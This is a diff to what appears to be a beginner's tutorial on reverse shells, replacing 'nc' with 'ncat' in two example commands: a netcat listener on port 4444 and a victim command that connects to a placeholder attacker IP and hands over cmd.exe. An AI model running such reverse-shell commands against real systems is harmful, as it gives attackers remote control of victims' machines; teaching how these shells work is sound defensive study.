@@ -17,7 +17,7 @@ Victim's Machine: When compromised, it connects back to the attacker's machine, 
 # Example 1: Attacker on Windows, Victim on Linux
 **Attacker (Windows)**: Sets up a listener using netcat.
 
-**Command**: nc -lvp 4444
+**Command**: ncat -lvp 4444
 
 **This means**: "Listen on port 4444 and wait for a connection."
 
@@ -36,7 +36,7 @@ Victim's Machine: When compromised, it connects back to the attacker's machine, 
 
 **Victim** (Windows): The attacker gets the victim to run this command.
 
-**Command**: nc <**Attacker_IP**> 5555 -e cmd.exe
+**Command**: ncat <**Attacker_IP**> 5555 -e cmd.exe
 
 **This means**: "Connect to the attacker’s IP on port 5555 and give them access to my Windows command prompt."
 
